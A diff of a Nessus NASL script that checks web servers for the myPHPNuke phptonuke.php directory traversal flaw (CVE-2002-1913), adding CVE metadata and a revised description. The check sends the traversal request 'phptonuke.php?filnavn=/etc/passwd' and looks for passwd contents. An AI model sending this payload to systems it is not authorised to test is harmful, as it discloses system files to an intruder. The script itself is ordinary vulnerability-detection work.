@@ -16,19 +16,39 @@
 if(description)
 {
  script_id(11824);
- script_version ("$Revision: 1.2 $");
+ script_version ("$Revision: 1.9 $");
 
- name["english"] = "phptonuke directory traversal";
+ script_cve_id("CVE-2002-1913");
+ script_bugtraq_id(5982);
+
+ name["english"] = "myPHPNuke phptonuke.php Directory Traversal";
 
  script_name(english:name["english"]);
  
  desc["english"] = "
-It is possible to read arbitrary files on the remote system
-by sending a special request like
-	phptonuke.php?filnavn=/etc/passwd
+Synopsis :
 
-Solution : Upgrade to the latest version
-Risk factor : Serious";
+The remote web server contains a PHP script that allows for reading of
+arbitrary files. 
+
+Description :
+
+The version of myPHPNuke installed on the remote host allows anyone to
+read arbitrary files by passing the full filename to the 'filnavn'
+argument of the 'phptonuke.php' script. 
+
+See also : 
+
+http://marc.theaimsgroup.com/?l=bugtraq&m=103480589031537&w=2
+
+Solution : 
+
+Upgrade to the latest version.
+
+Risk factor : 
+
+Low / CVSS Base Score : 2 
+(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:N)";
 
  script_description(english:desc["english"]);
  summary["english"] = "Reads file through phptonuke.php";
@@ -40,9 +60,10 @@ Risk factor : Serious";
  family["english"] = "CGI abuses";
  family["francais"] = "Abus de CGI";
  script_family(english:family["english"], francais:family["francais"]);
- script_dependencie("find_service.nes", "http_version.nasl");
+ script_dependencie("http_version.nasl");
 		  
  script_require_ports("Services/www", 80);
+ script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
 }
 
@@ -51,9 +72,10 @@ Risk factor : Serious";
 include("http_func.inc");
 include("http_keepalive.inc");
 
-port = get_kb_item("Services/www");
-if(!port) port = 80;
+port = get_http_port(default:80);
+
 if(!get_port_state(port)) exit(0);
+if(! can_host_php(port:port) ) exit(0);
 
 
 function check(loc)
@@ -61,20 +83,19 @@ function check(loc)
  local_var	req, r;
  req = http_get(item:string(loc, "/phptonuke.php?filnavn=/etc/passwd"),
 		port:port);
- r = http_keepalive_send_recv(port:port, data:req);
+ r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(r)) exit(0);
  if(r =~ "root:.*:0:[01]:.*")
  {
-  security_hole(port);
+  security_note(port);
   exit(0);
  }
 }
 
 
-dirs = make_list("", cgi_dirs());
 
 
-foreach dir (dirs)
+foreach dir ( cgi_dirs() )
 {
  check(loc:dir);
 }
